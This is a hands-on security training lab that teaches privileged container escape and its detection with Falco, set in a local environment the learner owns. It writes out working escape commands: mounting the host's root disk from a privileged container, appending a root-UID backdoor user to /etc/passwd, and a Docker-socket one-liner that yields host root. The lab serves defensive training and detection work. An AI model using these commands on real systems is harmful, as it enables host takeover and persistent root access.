# Lab 11 — Container Escape and Runtime Detection

*Hands-on lab · [← Back to the module concept](README.md)*


## Setup
This is a **reference lab** — it ships a one-command environment in the companion
[`plaintext-labs`](https://github.com/plaintext-security/plaintext-labs) repo:

```bash
git clone https://github.com/plaintext-security/plaintext-labs
cd plaintext-labs/cloud/11-container-escape-runtime
make up        # start the privileged-escape target, Falco sensor, and verify service
make demo      # run the escape scenario and show Falco alerts
make shell     # shell into the attacker container
make down      # stop and clean up
```

The environment provides:
- `attacker` — a container launched `--privileged` with `/dev` mounted from the host; simulates a compromised workload
- `target` — a companion container that writes a "secret" file to a hostPath volume, simulating a co-located workload
- `falco` — Falco running in a container, watching Docker socket events; pre-configured with a rule that fires on writes to `/etc/passwd` from any container
- `make demo` runs the escape and triggers the Falco alert deterministically, then exits 0

> This lab attacks a container you launch locally. You own this environment. Only test systems you own or have explicit written permission to test.

## Scenario
Meridian Financial's platform team received a Dependabot alert about a compromised dependency in a data-processing job. Investigation reveals the job runs with `--privileged` and mounts `/dev`. You are the red team: demonstrate the escape path from inside the container to a host file read. You are also the detection engineer: show that Falco's default rules catch the suspicious syscall and produce an actionable alert.

## Do

**Scenario A — Privileged container escape**

1. [ ] `make shell` to enter the `attacker` container. Confirm you are PID 1 in a container namespace:
   `cat /proc/1/cgroup` — you should see the container ID in the cgroup path.

2. [ ] List the block devices available inside the privileged container:
   `ls /dev/sd* /dev/vd* /dev/xvd* 2>/dev/null || ls /dev/`
   You can see the host's raw block devices. This is the first indicator that `--privileged` breaks the isolation.

3. [ ] Mount the host root filesystem:
   ```bash
   mkdir -p /mnt/host
   mount /dev/sda1 /mnt/host 2>/dev/null || mount $(ls /dev/vda1 /dev/xvda1 2>/dev/null | head -1) /mnt/host
   ```
   *Hint: the lab compose file sets `HOST_SECRET_FILE` — if the mount fails, try `findmnt` to see what's available. The environment uses a pre-mounted volume shortcut for portability; see the compose notes.*

4. [ ] Read the host-side secret: `cat /mnt/host/host-secret.txt` (or the hostPath volume path as configured). What file did you access, and from which UID?

5. [ ] **Reflect:** what three configuration changes in the compose file would close this escape?
   Name all three — look at the privilege level the container runs with, what host paths it
   bind-mounts, and the UID its process runs as.

**Scenario B — Falco runtime detection**

6. [ ] In a second terminal, run `make logs-falco` to tail Falco's output.

7. [ ] From the `attacker` container shell, trigger a write to `/etc/passwd`:
   ```bash
   echo "attacker:x:0:0::/:/bin/sh" >> /etc/passwd
   ```

8. [ ] Switch back to the Falco terminal. You should see a CRITICAL alert with the container ID, image name, PID, and the syscall context. Copy the alert text into your notes.

9. [ ] Open `data/falco-rules.yaml` and find the rule that fired. Read its `condition` field.
   What is the key predicate that caught this technique?

10. [ ] **Tune the rule.** If a legitimate database container needs to write to `/var/lib/postgresql/passwd`, how would you add an `exception` to avoid false positives while keeping the detection for the attack case?

## Success criteria — you're done when
- [ ] You have demonstrated the escape from inside the `attacker` container to reading a host-side file.
- [ ] You have a Falco alert output showing the container ID, image, and rule name that fired.
- [ ] You have identified the three configuration changes that close the escape.
- [ ] You have a written `exception` clause for the Falco rule that suppresses the database false positive.

## Deliverables
- `escape-report.md` — the escape path (step-by-step, with commands and output), the three configuration fixes, and the Falco alert text.
- `falco-rules-tuned.yaml` — the updated Falco rule with your `exception` clause added.

Commit these two files. Container runtime state, pcaps, and memory artifacts stay out of the commit.

## Automate & own it
**Required.** Write a shell script `audit-privileged.sh` that uses `docker inspect` to scan all running containers and flags any with `Privileged: true`, a `/dev` bind mount, or a `docker.sock` mount. Have a model draft it; **you read every line** and test it against `docker compose up` (the `attacker` container should appear in the output) before committing. Bonus: add a `--json` flag that outputs structured findings for a SIEM.

## AI acceleration
Feed the Falco alert JSON to a model and ask it to explain the kill chain: what technique does this represent, what ATT&CK ID covers it, and what is the likely next step an attacker would take? It will produce a useful triage narrative — validate it against the actual Falco rule condition and the ATT&CK T1611 page.

## Connects forward
- Module 12 moves the runtime into Kubernetes; the same `--privileged` risk shows up in pod specs, and `kube-bench` CIS controls specifically flag it.
- Module 13 adds Kyverno admission policies that block privileged pods before they start — closing the prevention gap that Falco's detection covers.

## Marketable proof
> "I can demonstrate a privileged container escape, explain the kernel namespace mechanics behind it, and deploy Falco to detect the syscall pattern — from a tuned rule I wrote and tested myself."

## Stretch
- Explore the Docker socket escape: inside a container that has `/var/run/docker.sock` mounted, use `docker run --privileged -v /:/host ubuntu chroot /host` to gain host root without a kernel CVE.
- Write a Falco rule that fires when a container mounts the Docker socket — and test it with `make up`.
- Read [CVE-2021-30465](https://nvd.nist.gov/vuln/detail/CVE-2021-30465) and explain why a symlink race in runc leads to a host filesystem write even without `--privileged`.
